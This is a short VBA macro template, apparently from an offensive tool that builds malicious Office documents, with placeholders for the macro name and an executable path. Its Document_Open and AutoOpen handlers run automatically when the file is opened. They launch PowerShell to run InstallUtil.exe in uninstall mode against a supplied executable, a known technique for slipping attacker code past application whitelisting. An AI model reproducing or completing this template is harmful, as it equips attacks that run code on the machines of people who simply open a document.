Sub {MACRO_NAME}()
    Dim str As String
    str = "powershell -NoExit -Command ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U {INSTALL_UTIL_EXE_PATH}"" "
    Shell str, vbNormalFocus
End Sub

Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub